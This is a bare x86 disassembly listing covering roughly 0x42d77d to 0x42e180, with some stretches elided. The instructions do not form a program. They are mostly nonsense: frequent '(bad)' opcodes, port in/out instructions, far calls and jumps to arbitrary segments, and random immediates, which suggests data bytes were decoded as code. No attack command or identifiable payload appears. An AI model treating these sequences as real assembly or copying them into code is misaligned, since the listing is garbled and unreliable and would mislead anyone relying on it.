  42d77d:	mov    dh,BYTE PTR [eax-0x6f]
  42d780:	aaa    
  42d781:	fistp  WORD PTR [edx+0x70]
  42d784:	scas   eax,DWORD PTR es:[edi]
  42d785:	mov    dh,0xe9
  42d787:	push   esi
  42d788:	rcr    DWORD PTR [edi+edi*4-0x71],cl
  42d78c:	mov    ds:0xf2f5cbad,eax
  42d791:	pop    ss
  42d792:	in     al,0x37
  42d794:	in     al,0x3c
  42d796:	(bad)  
  42d797:	add    ah,BYTE PTR [esi-0x5de4cde0]
  42d79d:	push   ebx
  42d79e:	das    
  42d79f:	lds    ebp,FWORD PTR [esi-0x304fed97]
  42d7a5:	jecxz  0x42d77e
  42d7a7:	and    dl,BYTE PTR [ebx+ebp*4+0x79]
  42d7ab:	pop    edi
  42d7ac:	test   eax,0x623b8d83
  42d7b1:	imul   eax
  42d7b3:	sub    eax,0xaa
	...
  42d814:	add    BYTE PTR [eax],al
  42d816:	xchg   esi,eax
  42d817:	fwait
  42d818:	cwde   
  42d819:	pop    edi
  42d81a:	popf   
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0xb9d44d95
  42d825:	xor    al,0x64
  42d827:	out    0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [ecx],dh
  42d82f:	test   al,0x59
  42d831:	dec    ebx
  42d832:	std    
  42d833:	arpl   WORD PTR [ecx],bx
  42d835:	push   0x23
  42d837:	jecxz  0x42d7fc
  42d839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d83a:	test   BYTE PTR [edx],0x22
  42d83d:	aam    0x74
  42d83f:	push   ecx
  42d840:	test   DWORD PTR [ebx],edx
  42d842:	xchg   ebx,eax
  42d843:	xchg   ebx,eax
  42d844:	mov    esi,0xf567c90
  42d849:	xor    BYTE PTR [eax+0x3134b6da],dh
  42d84f:	ret    
  42d850:	imul   eax,DWORD PTR [ecx+0x28],0x3f
  42d854:	outs   dx,DWORD PTR ds:[esi]
  42d855:	pusha  
  42d856:	(bad)  [esi]
  42d858:	inc    eax
  42d859:	mov    cs,WORD PTR ds:0x4cdeb910
  42d85f:	pop    ss
  42d860:	sbb    DWORD PTR [ecx],esp
  42d862:	pusha  
  42d863:	dec    esp
  42d864:	pop    ecx
  42d865:	mov    al,ds:0x432a5e64
  42d86a:	xor    BYTE PTR [ebx-0x72818036],cl
  42d870:	call   0x112e:0xf8257059
  42d877:	ss daa 
  42d879:	repnz xor DWORD PTR ds:0x33479df5,0x675edb67
  42d884:	lahf   
  42d885:	dec    ebp
  42d886:	ficomp DWORD PTR [ebx+0xe84e34e]
  42d88c:	jnp    0x42d8b4
  42d88e:	repz daa 
  42d890:	sar    BYTE PTR [ebx-0x69],cl
  42d893:	sar    DWORD PTR [edx],cl
  42d895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d896:	icebp  
  42d897:	cmp    edx,DWORD PTR [edi+eax*8]
  42d89a:	in     eax,dx
  42d89b:	mov    ds:0x8e686ec,eax
  42d8a0:	jmp    0x42d846
  42d8a2:	scas   al,BYTE PTR es:[edi]
  42d8a3:	xor    eax,0x31580456
  42d8a8:	xchg   ecx,eax
  42d8a9:	jl     0x42d85b
  42d8ab:	xchg   edx,eax
  42d8ac:	std    
  42d8ad:	inc    edi
  42d8ae:	stc    
  42d8af:	je     0x42d85c
  42d8b1:	push   edi
  42d8b2:	into   
  42d8b3:	iret   
  42d8b4:	call   0xe660766b
  42d8b9:	rol    DWORD PTR ss:0x3b7b6d76,1
  42d8c0:	clc    
  42d8c1:	es jnp 0x42d8b9
  42d8c4:	fs clc 
  42d8c6:	jp     0x42d8ba
  42d8c8:	and    dl,cl
  42d8ca:	cmp    al,0xc9
  42d8cc:	cmp    eax,0x81ca985e
  42d8d1:	js     0x42d8ed
  42d8d3:	push   esp
  42d8d4:	dec    edi
  42d8d5:	dec    esp
  42d8d6:	outs   dx,DWORD PTR ds:[esi]
  42d8d7:	inc    ecx
  42d8d8:	cdq    
  42d8d9:	pop    esi
  42d8da:	push   edi
  42d8db:	aaa    
  42d8dc:	fistp  DWORD PTR [eax-0x103d5bd4]
  42d8e2:	and    al,0xf4
  42d8e4:	mov    ds:0xcbee9d03,al
  42d8e9:	pop    ebx
  42d8ea:	xlat   BYTE PTR ds:[ebx]
  42d8eb:	test   DWORD PTR [edi],eax
  42d8ed:	cmp    cl,BYTE PTR [ecx+edx*4-0x10821b14]
  42d8f4:	jns    0x42d887
  42d8f6:	addr16 mov eax,ds:0x9627
  42d8fa:	stc    
  42d8fb:	push   cs
  42d8fc:	imul   esp,DWORD PTR [ebp+0x35f7bbe1],0x439f8cb3
  42d906:	and    ecx,DWORD PTR [eax+0x57e35fee]
  42d90c:	ins    DWORD PTR es:[edi],dx
  42d90d:	shl    BYTE PTR [edi-0x1b2409b0],1
  42d913:	mov    WORD PTR [eax-0x24],cs
  42d916:	push   ebx
  42d917:	dec    edi
  42d918:	in     eax,0xd5
  42d91a:	or     BYTE PTR [eax+0x1],0x4c
  42d91e:	icebp  
  42d91f:	addr16 sahf 
  42d921:	loope  0x42d980
  42d923:	pusha  
  42d924:	sbb    BYTE PTR [eax-0x463a8aba],cl
  42d92a:	rcl    DWORD PTR [edi+edi*2-0x2],cl
  42d92e:	arpl   sp,sp
  42d930:	cwde   
  42d931:	data16 jl 0x42d8d6
  42d934:	mov    dl,0x0
	...
  42d996:	stc    
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x23e47614,ecx
  42d9a5:	loop   0x42da12
  42d9a7:	call   0x149d9ad
  42d9ac:	add    BYTE PTR [eax],al
  42d9ae:	in     al,dx
  42d9af:	xchg   edx,eax
  42d9b0:	and    bl,BYTE PTR [edi+0x546f5ff1]
  42d9b6:	fwait
  42d9b7:	sbb    cl,BYTE PTR [ebx+eiz*8+0x7668c74]
  42d9be:	adc    DWORD PTR [edx+0x39e380ec],0x45
  42d9c5:	xlat   BYTE PTR ds:[ebx]
  42d9c6:	jo     0x42da28
  42d9c8:	ficomp DWORD PTR [edi-0x2be1450a]
  42d9ce:	aam    0x19
  42d9d0:	jb     0x42d9e9
  42d9d2:	inc    ebp
  42d9d3:	out    0x7e,al
  42d9d5:	mov    eax,0xa7323488
  42d9da:	xor    eax,0x76109455
  42d9df:	(bad)  
  42d9e0:	push   0xb487f87e
  42d9e5:	fs jbe 0x42d989
  42d9e8:	(bad)  
  42d9e9:	mov    ecx,0xf0c713b8
  42d9ee:	(bad)  
  42d9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9f0:	dec    ebx
  42d9f1:	in     al,0x98
  42d9f3:	jmp    0x48de:0x57eceddc
  42d9fa:	js     0x42da29
  42d9fc:	xlat   BYTE PTR ds:[ebx]
  42d9fd:	bound  esi,QWORD PTR [esi-0x53a8b114]
  42da03:	push   ebp
  42da04:	imul   edx,DWORD PTR [ebp+0x5],0xfa56ea09
  42da0b:	inc    ebp
  42da0c:	inc    edx
  42da0d:	sbb    eax,0xe7fb3f94
  42da12:	(bad)  
  42da13:	nop
  42da14:	out    0xa6,al
  42da16:	mov    WORD PTR [esi+0x24],ss
  42da19:	leave  
  42da1a:	adc    BYTE PTR [ebx],dh
  42da1c:	xchg   DWORD PTR [ebp+0x13],ecx
  42da1f:	in     eax,0xfc
  42da21:	sahf   
  42da22:	leave  
  42da23:	scas   eax,DWORD PTR es:[edi]
  42da24:	xchg   edi,eax
  42da25:	dec    ebp
  42da26:	add    eax,0x9bbaa587
  42da2b:	loope  0x42da07
  42da2d:	popa   
  42da2e:	popa   
  42da2f:	pop    edx
  42da30:	mov    dh,BYTE PTR [esi+0x462dee14]
  42da36:	cmc    
  42da37:	cld    
  42da38:	sbb    ah,ah
  42da3a:	push   ds
  42da3b:	xchg   DWORD PTR [eax-0x5c],edi
  42da3e:	popf   
  42da3f:	test   al,0x92
  42da41:	adc    al,dl
  42da43:	aaa    
  42da44:	imul   bh
  42da46:	pop    ebp
  42da47:	daa    
  42da48:	jns    0x42da58
  42da4a:	mov    bl,0x24
  42da4c:	aas    
  42da4d:	out    0xb1,al
  42da4f:	in     al,0x3e
  42da51:	jmp    0xc2b0:0x1537c748
  42da58:	xchg   esp,eax
  42da59:	int3   
  42da5a:	aad    0xd9
  42da5c:	mov    al,al
  42da5e:	sub    DWORD PTR [esi],ecx
  42da60:	lahf   
  42da61:	mov    ds:0x3cf75c8,al
  42da66:	sub    al,0xbb
  42da68:	hlt    
  42da69:	pushw  ds
  42da6b:	push   edx
  42da6c:	test   DWORD PTR [edx-0x79],0x936a85e6
  42da73:	push   cs
  42da74:	sub    DWORD PTR [ebx+0x2c426cbe],esp
  42da7a:	daa    
  42da7b:	inc    ecx
  42da7c:	sub    bl,BYTE PTR [eax-0x2f]
  42da7f:	ror    BYTE PTR [ecx-0x7001122e],cl
  42da85:	xor    esp,esp
  42da87:	push   eax
  42da88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da89:	inc    esi
  42da8a:	and    DWORD PTR [edx-0x1524945f],0x13
  42da91:	push   esi
  42da92:	lods   ax,WORD PTR ds:[esi]
  42da94:	aaa    
  42da95:	or     al,BYTE PTR [ebx+0x4a]
  42da98:	loop   0x42dab0
  42da9a:	scas   al,BYTE PTR es:[edi]
  42da9b:	mov    cl,BYTE PTR [eax]
  42da9d:	add    WORD PTR [edx-0x7d46cb02],0xffdf
  42daa5:	inc    ecx
  42daa6:	or     al,0x94
  42daa8:	(bad)  
  42daa9:	mov    ebx,0x2e9a48a8
  42daae:	xor    DWORD PTR [ecx],0xa4c52463
  42dab4:	xlat   BYTE PTR ds:[ebx]
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db7c
  42db23:	lock shl BYTE PTR [edx+esi*2],cl
  42db27:	jmp    0x149db2d
  42db2c:	add    BYTE PTR [eax],al
  42db2e:	xchg   ecx,eax
  42db2f:	xor    eax,0x4a2b6036
  42db34:	xor    al,0xf2
  42db36:	(bad)  
  42db37:	gs mov bl,0x84
  42db3a:	ss sub ebx,eax
  42db3d:	add    al,0xac
  42db3f:	sub    ecx,DWORD PTR [esi]
  42db41:	mov    ch,0x5f
  42db43:	sbb    al,0xb8
  42db45:	add    al,0x9c
  42db47:	loopne 0x42db19
  42db49:	arpl   WORD PTR [esi+ecx*4],bp
  42db4c:	mov    cl,0x6d
  42db4e:	retf   
  42db4f:	sub    BYTE PTR [ebx],0x67
  42db52:	(bad)  
  42db53:	data16 cmp BYTE PTR [ecx+0x2c],cl
  42db57:	fcmovnbe st,st(1)
  42db59:	cmp    al,0xfa
  42db5b:	imul   esi,DWORD PTR [eax],0xf61a9a1e
  42db61:	je     0x42db96
  42db63:	cdq    
  42db64:	xchg   edx,eax
  42db65:	jl     0x42dbce
  42db67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db68:	leavew 
  42db6a:	jns    0x42db19
  42db6c:	jbe    0x42db65
  42db6e:	mov    bh,ch
  42db70:	cld    
  42db71:	retf   0xf2aa
  42db74:	sub    bl,0xb8
  42db77:	test   BYTE PTR [esi+0x75f606b1],0x19
  42db7e:	xchg   esi,eax
  42db7f:	(bad)  
  42db81:	adc    al,0xdd
  42db83:	cmc    
  42db84:	and    edi,DWORD PTR [ebx+0x4c]
  42db87:	adc    eax,0x8c42ab44
  42db8c:	jl     0x42dc04
  42db8e:	jp     0x42db47
  42db90:	cs rol ch,1
  42db93:	inc    BYTE PTR [ebp-0x5db9b556]
  42db99:	mov    ah,dl
  42db9b:	sahf   
  42db9c:	mov    bh,0x31
  42db9e:	pusha  
  42db9f:	js     0x42db5b
  42dba1:	popa   
  42dba2:	push   0xd
  42dba4:	adc    esi,edi
  42dba6:	dec    edx
  42dba7:	inc    esp
  42dba8:	cdq    
  42dba9:	repnz aad 0x21
  42dbac:	inc    edx
  42dbad:	dec    eax
  42dbae:	mov    ecx,DWORD PTR [edx+0x6dfaa1b1]
  42dbb4:	clc    
  42dbb5:	cmc    
  42dbb6:	push   cs
  42dbb7:	(bad)  
  42dbb8:	mov    BYTE PTR [ebx],ah
  42dbba:	les    esp,FWORD PTR [ebx+0x63]
  42dbbd:	inc    ebx
  42dbbe:	test   BYTE PTR [eax-0x3a2b5a90],cl
  42dbc4:	mov    edx,0x6dfcf4d0
  42dbc9:	scas   al,BYTE PTR es:[edi]
  42dbca:	ret    0x2900
  42dbcd:	mov    ds:0x3b6bbf73,al
  42dbd2:	xor    eax,0xa12b5577
  42dbd7:	dec    edi
  42dbd8:	fwait
  42dbd9:	stos   BYTE PTR es:[edi],al
  42dbda:	stc    
  42dbdb:	or     al,0x4b
  42dbdd:	cmp    edi,DWORD PTR [edi-0x6d]
  42dbe0:	mov    ds:0x75e38858,eax
  42dbe5:	or     eax,0xc6b73eca
  42dbea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbeb:	and    bl,BYTE PTR [ecx]
  42dbed:	xor    bh,BYTE PTR [eax]
  42dbef:	xchg   DWORD PTR [edx],ecx
  42dbf1:	sub    dl,0xa2
  42dbf4:	fbld   TBYTE PTR [edx+0x23b1009]
  42dbfa:	mov    al,0x53
  42dbfc:	scas   al,BYTE PTR es:[edi]
  42dbfd:	adc    BYTE PTR [ebx+0x3cb78da7],ah
  42dc03:	mov    edx,DWORD PTR [ecx-0x7b]
  42dc06:	jmp    0xda12ec81
  42dc0b:	cmp    DWORD PTR [edx+ebp*4+0x2a],edi
  42dc0f:	repz pusha 
  42dc11:	push   es
  42dc12:	in     eax,0x25
  42dc14:	mov    eax,0xe734a53f
  42dc19:	cmc    
  42dc1a:	push   0x20
  42dc1c:	mov    es,WORD PTR [esi]
  42dc1e:	in     al,0x88
  42dc20:	out    dx,al
  42dc21:	fwait
  42dc22:	imul   ecx,esp,0x158ea029
  42dc28:	stos   DWORD PTR es:[edi],eax
  42dc29:	adc    DWORD PTR [edi+0x24],esp
  42dc2c:	inc    esi
  42dc2d:	cs xchg edi,eax
  42dc2f:	push   es
  42dc30:	nop    DWORD PTR [ecx]
  42dc33:	jge    0x42dbe3
	...
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x9e27f285
  42dca4:	mov    al,ds:0x1ea79da
  42dca9:	add    BYTE PTR [edi],al
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [ebx+0x44],ch
  42dcb0:	aas    
  42dcb1:	cmp    edi,edi
  42dcb3:	ins    DWORD PTR es:[edi],dx
  42dcb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dcb5:	outs   dx,DWORD PTR ds:[esi]
  42dcb6:	sbb    eax,0x7c7a9f63
  42dcbb:	xor    BYTE PTR [esi-0x6e],dl
  42dcbe:	lods   al,BYTE PTR ds:[esi]
  42dcbf:	clc    
  42dcc0:	sbb    edx,esi
  42dcc2:	mov    dh,0xf1
  42dcc4:	fmul   st,st(7)
  42dcc6:	js     0x42dca8
  42dcc8:	and    eax,DWORD PTR [edi-0x1c0fb51a]
  42dcce:	ds jnp 0x42dcc8
  42dcd1:	popf   
  42dcd2:	or     DWORD PTR [edi+0x73a41560],eax
  42dcd8:	imul   ebx,DWORD PTR [ebx],0x2d12e8c0
  42dcde:	fwait
  42dcdf:	leave  
  42dce0:	adc    DWORD PTR [edx],esp
  42dce2:	(bad)  
  42dce3:	sub    al,0x33
  42dce5:	push   es
  42dce6:	ja     0x42dcce
  42dce8:	fst    QWORD PTR [eax]
  42dcea:	repnz push edx
  42dcec:	das    
  42dced:	dec    ebp
  42dcee:	add    DWORD PTR [edx+0x5c57d19a],esp
  42dcf4:	push   0x23f157ea
  42dcf9:	mov    es,edi
  42dcfb:	fs pop es
  42dcfd:	jge    0x42dd5b
  42dcff:	xchg   ebx,eax
  42dd00:	retf   0x4541
  42dd03:	mov    ds:0x2a94b89b,al
  42dd08:	xlat   BYTE PTR ds:[ebx]
  42dd09:	and    ecx,edi
  42dd0b:	retf   0x4c78
  42dd0e:	retf   
  42dd0f:	cmp    al,0x19
  42dd11:	cs sub eax,0x92ebd84e
  42dd17:	jbe    0x42dc9a
  42dd19:	rcl    DWORD PTR [ecx],cl
  42dd1b:	dec    edi
  42dd1c:	mov    ebp,0xfd8f7313
  42dd21:	adc    BYTE PTR [ebx-0x61e4af41],0xb0
  42dd28:	mov    al,ds:0xaac10de2
  42dd2d:	and    DWORD PTR [edx+0x63],ebp
  42dd30:	push   0x645b64a6
  42dd35:	mov    gs,WORD PTR cs:[eax]
  42dd38:	adc    al,0xd0
  42dd3a:	jae    0x42dd6f
  42dd3c:	jmp    0xc40a:0xff791afc
  42dd43:	scas   eax,DWORD PTR es:[edi]
  42dd44:	in     al,0x9c
  42dd46:	sbb    al,0xc3
  42dd48:	(bad)  
  42dd4a:	call   0xd7639fcd
  42dd4f:	xor    edx,DWORD PTR [ecx-0x406988d0]
  42dd55:	je     0x42dd15
  42dd57:	in     al,0xb6
  42dd59:	cmp    ebx,DWORD PTR [ecx-0x13]
  42dd5c:	sub    edi,ebp
  42dd5e:	adc    BYTE PTR [ebx-0x73],bh
  42dd61:	cmp    al,0x1e
  42dd63:	inc    esi
  42dd64:	pop    esp
  42dd65:	xor    DWORD PTR [ebp-0x1209a1a5],edx
  42dd6b:	jnp    0x42dd2b
  42dd6d:	add    esi,esp
  42dd6f:	daa    
  42dd70:	aas    
  42dd71:	add    eax,0xae033ef2
  42dd76:	dec    esi
  42dd77:	ins    DWORD PTR es:[edi],dx
  42dd78:	xor    DWORD PTR [edx+0x3a],edx
  42dd7b:	cli    
  42dd7c:	lahf   
  42dd7d:	mov    BYTE PTR [edi+0x2c3e254b],ch
  42dd83:	xchg   edi,eax
  42dd84:	test   BYTE PTR [ebp-0x65a13121],al
  42dd8a:	mov    esi,0x820c376e
  42dd8f:	mov    al,0xd0
  42dd91:	jmp    0x194918eb
  42dd96:	outs   dx,DWORD PTR ds:[esi]
  42dd97:	inc    ecx
  42dd98:	cli    
  42dd99:	mov    ch,0xdf
  42dd9b:	mov    BYTE PTR [eax-0x47b456ab],ah
  42dda1:	lock sub DWORD PTR [edi+0x1a],0xbb5ae809
  42dda9:	mov    dh,bl
  42ddab:	push   ss
  42ddac:	push   ecx
  42ddad:	jbe    0x42dd63
  42ddaf:	shr    DWORD PTR ds:0x97753651,1
	...
  42de15:	add    dh,ah
  42de17:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x9b381c07
  42de25:	mov    esp,0x1eb80
  42de2a:	pop    es
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [eax],ch
  42de2f:	inc    ecx
  42de30:	ins    BYTE PTR es:[edi],dx
  42de31:	xor    dh,BYTE PTR [ebx+0x7e9b7fb3]
  42de37:	loope  0x42de71
  42de39:	mov    esp,DWORD PTR [ebp-0x3f]
  42de3c:	std    
  42de3d:	add    bh,BYTE PTR [edx+eiz*2+0x71]
  42de41:	pop    edx
  42de42:	stos   BYTE PTR es:[edi],al
  42de43:	loope  0x42de07
  42de45:	shl    BYTE PTR [eax-0x282182ed],1
  42de4b:	push   0x4892ff06
  42de50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de51:	cmc    
  42de52:	imul   edx,DWORD PTR [edi-0x19005b82],0x48
  42de59:	mov    eax,ds:0xc7d9ee37
  42de5e:	or     al,0x2d
  42de60:	in     al,0xef
  42de62:	jb     0x42de36
  42de64:	or     esi,DWORD PTR [ecx-0x1a]
  42de67:	or     eax,0x138d3770
  42de6c:	dec    ebx
  42de6d:	jno    0x42de1f
  42de6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de70:	in     eax,0x54
  42de72:	femms  
  42de74:	call   0x23bf:0x9a36503e
  42de7b:	rol    DWORD PTR [eax-0x67],cl
  42de7e:	imul   esi,edi,0x6e
  42de81:	daa    
  42de82:	pusha  
  42de83:	outs   dx,BYTE PTR ds:[esi]
  42de84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de85:	mov    al,ds:0x47e35
  42de8a:	je     0x42de0f
  42de8c:	mov    DWORD PTR [edx+0x6e383f9b],eax
  42de92:	adc    al,0x9
  42de94:	mov    DWORD PTR [ecx],esi
  42de96:	hlt    
  42de97:	js     0x42de8d
  42de99:	cld    
  42de9a:	pop    esi
  42de9b:	ret    0xd722
  42de9e:	ins    DWORD PTR es:[edi],dx
  42de9f:	retf   
  42dea0:	in     eax,dx
  42dea1:	xchg   ebp,eax
  42dea2:	sbb    dl,BYTE PTR [ecx]
  42dea4:	je     0x42de7f
  42dea6:	popa   
  42dea7:	cld    
  42dea8:	popf   
  42dea9:	shl    BYTE PTR [esi-0xc],0x87
  42dead:	mov    ds:0xd981bbe0,eax
  42deb2:	push   ebx
  42deb3:	push   0x712ef08d
  42deb8:	sub    bl,0xf4
  42debb:	and    eax,esp
  42debd:	sub    eax,0xb6d59ba8
  42dec2:	add    BYTE PTR [eax-0x5f],bl
  42dec5:	sub    DWORD PTR [edi+0x66],ebx
  42dec8:	test   eax,0xc7ad9605
  42decd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dece:	scas   al,BYTE PTR es:[edi]
  42decf:	jno    0x42df38
  42ded1:	jbe    0x42de6d
  42ded3:	add    DWORD PTR [ebp-0x9],esp
  42ded6:	out    dx,eax
  42ded7:	shl    cl,0x66
  42deda:	xor    eax,0xda4a430c
  42dedf:	lods   al,BYTE PTR ds:[esi]
  42dee0:	data16 xchg BYTE PTR [ebp+0xf316c60],dl
  42dee7:	call   0xdc06:0x224bef1d
  42deee:	inc    ecx
  42deef:	data16 cmc 
  42def1:	cmp    bh,ch
  42def3:	or     BYTE PTR ds:0x78b6acfb,dl
  42def9:	cmp    al,0x36
  42defb:	inc    ebx
  42defc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42defd:	shr    BYTE PTR [eax],0x63
  42df00:	clc    
  42df01:	clc    
  42df02:	lea    ecx,[edx]
  42df04:	loop   0x42df70
  42df06:	add    BYTE PTR [esi-0x4b],bl
  42df09:	test   BYTE PTR [ebp+eax*2+0x70],dh
  42df0d:	dec    edi
  42df0e:	mov    cl,BYTE PTR [esi+eiz*2+0x1c]
  42df12:	out    0x17,eax
  42df14:	inc    edi
  42df15:	add    esp,DWORD PTR [eax+0x56]
  42df18:	in     eax,0x31
  42df1a:	loopne 0x42df3f
  42df1c:	dec    edx
  42df1d:	das    
  42df1e:	sar    DWORD PTR [edx-0x3d],cl
  42df21:	sbb    eax,0x3848ecc1
  42df26:	dec    esi
  42df27:	addr16 mov bl,0x6d
  42df2a:	not    DWORD PTR es:[esi-0x3a5553d2]
  42df31:	ror    BYTE PTR [eax+0x74],0xd6
	...
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	fs scas eax,DWORD PTR es:[edi]
  42dfa4:	ror    BYTE PTR [edx],cl
  42dfa6:	xchg   esp,ebp
  42dfa8:	add    DWORD PTR [eax],eax
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [edi+eiz*4+0x6b],ch
  42dfb1:	fstp   TBYTE PTR [eax+0x5c11ed0a]
  42dfb7:	add    BYTE PTR [edi+0x3ccd1c40],bl
  42dfbd:	mov    edx,0xc85bf57a
  42dfc2:	cwde   
  42dfc3:	(bad)  
  42dfc6:	adc    eax,0xe348cb4d
  42dfcb:	dec    ebp
  42dfcc:	leave  
  42dfcd:	add    al,0xc8
  42dfcf:	jno    0x42e015
  42dfd1:	sbb    edi,DWORD PTR [ebx-0x173c2c99]
  42dfd7:	pop    esp
  42dfd8:	jmp    0x42df8d
  42dfda:	mov    ebp,0xa8ed1772
  42dfdf:	xor    eax,0x758da041
  42dfe4:	cmc    
  42dfe5:	lds    edx,FWORD PTR [ebp-0x64]
  42dfe8:	sbb    BYTE PTR [eax],al
  42dfea:	daa    
  42dfeb:	add    edx,esi
  42dfed:	(bad)  
  42dfee:	jl     0x42e039
  42dff0:	in     eax,0x8d
  42dff2:	add    edi,edx
  42dff4:	aaa    
  42dff5:	cmp    BYTE PTR [edx+eax*4],bl
  42dff8:	xor    BYTE PTR [eax+ecx*2-0x37cacee2],cl
  42dfff:	std    
  42e000:	mov    gs,edi
  42e002:	dec    ebx
  42e003:	addr16 cli 
  42e005:	fwait
  42e006:	ret    0x80da
  42e009:	mov    ds:0x7b0cf98c,eax
  42e00e:	jbe    0x42df9d
  42e010:	shl    dh,cl
  42e012:	pop    esp
  42e013:	add    al,0x15
  42e015:	ror    eax,0x96
  42e018:	cmp    bh,dh
  42e01a:	inc    esi
  42e01b:	mov    ecx,0xab59f63e
  42e020:	icebp  
  42e021:	add    ebx,DWORD PTR [eax]
  42e023:	pop    edx
  42e024:	or     BYTE PTR [esi-0x2a],ah
  42e027:	dec    edi
  42e028:	cmp    ebx,DWORD PTR [esi]
  42e02a:	sbb    al,0x38
  42e02c:	xor    al,BYTE PTR [ebx-0x5b]
  42e02f:	int    0x4f
  42e031:	ror    BYTE PTR [esi+0x6ba67db9],0xe0
  42e038:	pusha  
  42e039:	or     al,0xfb
  42e03b:	inc    esp
  42e03c:	mov    al,ds:0xe960f04f
  42e041:	and    al,0x7b
  42e043:	ss inc ebp
  42e045:	pop    edi
  42e046:	fdivrp st(1),st
  42e048:	fiadd  DWORD PTR [ecx-0x15235881]
  42e04e:	(bad)  
  42e04f:	fcom   st(3)
  42e051:	mov    ch,0x75
  42e053:	or     BYTE PTR [edi],bl
  42e055:	push   es
  42e056:	push   edi
  42e057:	mov    bl,0x0
  42e059:	lods   eax,DWORD PTR ds:[esi]
  42e05a:	xchg   ecx,eax
  42e05b:	clc    
  42e05c:	dec    esp
  42e05d:	adc    al,al
  42e05f:	aaa    
  42e060:	jge    0x42e0c4
  42e062:	and    edi,edx
  42e064:	sar    edx,0xa3
  42e067:	xchg   esi,eax
  42e068:	jmp    0x44e20ae6
  42e06d:	xor    al,0xa0
  42e06f:	gs ja  0x42e060
  42e072:	mov    cl,0xc7
  42e074:	leave  
  42e075:	add    eax,0x1d4d665b
  42e07a:	(bad)  
  42e07b:	cmp    BYTE PTR [ebp+eiz*4-0x55c385ba],dl
  42e082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e083:	fisubr WORD PTR [eax+0x489b5c1f]
  42e089:	adc    al,0x5f
  42e08b:	and    ch,ch
  42e08d:	cmp    eax,0x5bc5e8bb
  42e092:	jbe    0x42e0fe
  42e094:	in     eax,dx
  42e095:	mov    ds:0xead71e85,al
  42e09a:	sbb    ebp,DWORD PTR [ecx-0x8]
  42e09d:	cmp    eax,0x841a6fa4
  42e0a2:	mov    esp,0x4a4ae10f
  42e0a7:	ds adc eax,0xf45b36dd
  42e0ad:	test   BYTE PTR [ebp+ebp*2-0x6fbb9272],dh
  42e0b4:	pop    esp
	...
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	xchg   esp,eax
  42e123:	out    0x65,al
  42e125:	pusha  
  42e126:	mov    gs,ebp
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    ah,ah
  42e12f:	add    ecx,DWORD PTR [ecx-0x68e5861f]
  42e135:	pushf  
  42e136:	ins    DWORD PTR es:[edi],dx
  42e137:	adc    eax,0x6e78fdc3
  42e13c:	outs   dx,BYTE PTR ds:[esi]
  42e13d:	in     eax,0xd3
  42e13f:	(bad)  
  42e140:	in     eax,0x3a
  42e142:	or     BYTE PTR [ebp-0x43],0xc
  42e146:	inc    ecx
  42e147:	retf   
  42e148:	shl    dh,0x98
  42e14b:	xor    ebp,DWORD PTR [edi-0x7c]
  42e14e:	or     ecx,DWORD PTR [esi-0x3d]
  42e151:	mov    bh,BYTE PTR [ecx+esi*4]
  42e154:	lods   eax,DWORD PTR ds:[esi]
  42e155:	mov    BYTE PTR [esi],ch
  42e157:	dec    esp
  42e158:	push   ebx
  42e159:	mov    bh,0x54
  42e15b:	iret   
  42e15c:	inc    edi
  42e15d:	aas    
  42e15e:	(bad)  
  42e15f:	(bad)  
  42e160:	daa    
  42e161:	and    esi,ecx
  42e163:	enter  0xda95,0x16
  42e167:	xor    al,0x96
  42e169:	dec    esi
  42e16a:	dec    esi
  42e16b:	ficomp DWORD PTR gs:[edi]
  42e16e:	lods   eax,DWORD PTR ds:[esi]
  42e16f:	xchg   ebp,eax
  42e170:	or     ecx,ebx
  42e172:	out    0xd0,eax
  42e174:	mov    dh,0x13
  42e176:	rcr    BYTE PTR [edi],1
  42e178:	scas   eax,DWORD PTR es:[edi]
  42e179:	out    0xf8,al
  42e17b:	push   es
  42e17c:	jp     0x42e177
  42e17e:	je     0x42e169
  42e180:	in     al,0x7c
